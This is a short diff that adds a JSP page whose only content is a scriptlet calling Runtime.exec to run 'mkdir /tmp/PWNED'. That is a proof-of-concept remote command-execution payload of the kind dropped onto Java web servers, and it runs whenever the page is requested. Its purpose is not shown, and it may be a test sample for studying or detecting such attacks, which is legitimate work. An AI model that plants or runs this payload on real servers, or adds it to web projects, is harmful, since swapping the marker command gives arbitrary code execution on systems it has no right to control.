@@ -1,0 +1,4 @@
+<%
+Runtime r = java.lang.Runtime.getRuntime();
+r.exec("mkdir /tmp/PWNED");
+%>
